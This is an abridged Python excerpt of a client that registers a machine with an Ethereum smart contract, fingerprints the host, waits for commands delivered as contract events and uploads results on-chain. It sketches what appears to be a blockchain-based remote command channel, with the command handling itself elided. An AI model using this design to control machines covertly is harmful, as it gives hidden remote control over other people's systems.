import argparse, json, signal, shutil, atexit, yaml, traceback
...
class ClientCommands:
    ...
    def registerInstance(self):
        ...
        try:
            ...
            l.debug('registerInstance transaction executed. machineId:', machineId, 'txHash:', bytes2Hex(txHash))

            self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
                                                                self.contractAbi,
                                                                self.contractAddress,
                                                                self.web3,
                                                                topicFilters=[Web3.sha3(hexstr=self.address).hex()])

            tx = waitFor(lambda: self.web3.eth.getTransactionReceipt(txHash), emptyResponse=None, pollInterval=1,
                         maxRetries=500)
            ...
            txs = waitFor(lambda: self.commandFilter.get_new_entries(), emptyResponse=[], pollInterval=1, maxRetries=500)
    ...
    def uploadWorkResults(self, cmdId, workResults):
		...
		'''
        machineId = OsInteractions.fingerprintMachine()
        sessionAndMachineIdHash = Web3.sha3(hexstr = self.sessionId + machineId)
        # function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
        txHash = self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId,
                                                 transact={'from': self.address, 'gas': self.gasLimit_ev})

        l.info("sending cmd results of cmdId", cmdId, "to server. txHash:", bytes2Hex(txHash), "result:", workResults, '...')
    ...
    def onCommandArrival(self, tx, eventABI):
        try:
    ...
    def run(self):
        ...
        try:
            l.info('Instance is now registered with server. Creating filter listener for incoming commands...')
            def commandFilterCreator(): return createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
                                                    self.contractAbi,
                                                    self.contractAddress,
                                                    self.web3,
                                                    topicFilters=[Web3.sha3(hexstr=self.address).hex()])
            ...
            worker = Thread(target=eventListenerLoop,
                            args=(commandFilterCreator, 1, self.onCommandArrival),
                            daemon=True)
            worker.start()
...
if __name__ == "__main__":
    ...
    parser.add_argument("baseDir",
                        help="Location of base directory. all conf, scripts and bin files are assumed to exist in a subdirectory of base dir.")
    parser.add_argument("--sessionid", default=None,
                        help="an existing sessionId for pre registered clients. Will cause client to skip initial registration process")
    parser.add_argument("--transactionLogFile", default=opj('logs', 'transaction.log'),
                        help="Location of transaction log file.")
